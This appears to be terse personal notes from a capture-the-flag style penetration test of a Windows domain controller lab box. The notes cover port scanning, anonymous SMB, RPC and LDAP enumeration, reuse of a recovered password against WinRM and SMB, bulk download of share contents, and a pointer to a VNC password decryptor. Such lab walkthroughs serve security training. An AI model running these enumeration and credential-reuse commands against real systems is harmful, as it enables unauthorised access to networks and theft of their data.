...
└─# nmap -p 53,88,135,389,445,636,3268,3269,5985 -sV -sC 10.129.56.255
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-20 06:26 EDT
...
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-20 10:26:10Z)
...
| smb2-time: 
|   date: 2022-08-20T10:26:24
|_  start_date: 2022-08-20T10:22:30
...
─(root㉿kali)-[/home/kali/Downloads]
└─# smbclient -N -L //10.129.56.255                                                  
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.56.255 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                           

                                                           but no shares

# rpc to list domain users

┌──(root㉿kali)-[/home/kali/Downloads]
└─# rpcclient -U '' -N 10.129.56.255                                                    
...
┌──(root㉿kali)-[/home/kali/Downloads]
└─# ldapsearch -h 10.129.56.255 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
...
creationTime: 133054645401048222
...
badPasswordTime: 0
lastLogoff: 0
lastLogon: 133054655073377210
localPolicyFlags: 0
pwdLastSet: 133054645716792776
primaryGroupID: 516
...
dSCorePropagationData: 20200109154857.0Z
dSCorePropagationData: 16010714223649.0Z
lastLogonTimestamp: 133054645801344925
...
we found a base654 encoded pasword
...
┌──(root㉿kali)-[/home/kali/Downloads]
└─# crackmapexec winrm 10.129.56.255 -u r.thompson -p rY4n5eva
SMB         10.129.56.255   5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
HTTP        10.129.56.255   5985   CASC-DC1         [*] http://10.129.56.255:5985/wsman
WINRM       10.129.56.255   5985   CASC-DC1         [-] cascade.local\r.thompson:rY4n5eva


# triying smb enumeration

┌──(root㉿kali)-[/home/kali/Downloads]
└─# crackmapexec smb -u r.thompson -p rY4n5eva --shares 10.129.56.255
SMB         10.129.56.255   445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.56.255   445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
SMB         10.129.56.255   445    CASC-DC1         [+] Enumerated shares
SMB         10.129.56.255   445    CASC-DC1         Share           Permissions     Remark
SMB         10.129.56.255   445    CASC-DC1         -----           -----------     ------
SMB         10.129.56.255   445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.129.56.255   445    CASC-DC1         Audit$                          
SMB         10.129.56.255   445    CASC-DC1         C$                              Default share
SMB         10.129.56.255   445    CASC-DC1         Data            READ            
SMB         10.129.56.255   445    CASC-DC1         IPC$                            Remote IPC
SMB         10.129.56.255   445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.129.56.255   445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.129.56.255   445    CASC-DC1         SYSVOL          READ            Logon server share 
            
# trying smb enumreation with cred using smbmap

──(root㉿kali)-[/home/kali/Downloads]
└─# smbmap -H 10.129.56.255 -u r.thompson -p rY4n5eva                             
[+] IP: 10.129.56.255:445	Name: 10.129.56.255                                     
...
# share enumeration and downloading all data

└─# smbclient --user r.thompson //10.129.56.255/data rY4n5eva
...
getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as IT/Email Archives/Meeting_Notes_June_2018.html (3.2 KiloBytes/sec) (average 3.2 KiloBytes/sec)
getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log (1.7 KiloBytes/sec) (average 2.4 KiloBytes/sec)
getting file \IT\Logs\DCs\dcdiag.log of size 5967 as IT/Logs/DCs/dcdiag.log (7.5 KiloBytes/sec) (average 4.1 KiloBytes/sec)
getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as IT/Temp/s.smith/VNC Install.reg (3.4 KiloBytes/sec) (average 4.0 KiloBytes/sec)

# looking at the file html
...
```
┌──(root㉿kali)-[/home/…/Downloads/IT/Temp/s.smith]
└─# cat VNC\ Install.reg 
...
we get the value of Passwor din hex. we need a decryptor 
for example : https://github.com/jeroennijhof/vncpwd
